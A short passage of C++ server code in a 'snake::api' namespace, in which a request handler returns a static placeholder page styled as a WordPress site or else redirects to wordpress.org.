        res.body = "<!DOCTYPE html>\n<html><head><title>WordPress Site</title></head>\n"
                   "<body><h1>Welcome to WordPress</h1><p>This is a WordPress installation.</p>"
                   "</body></html>";
    } else {
        res.status = 302;
        res.set_header("Location", "https://wordpress.org");
        res.body.clear();
    }
}

}  // namespace snake::api
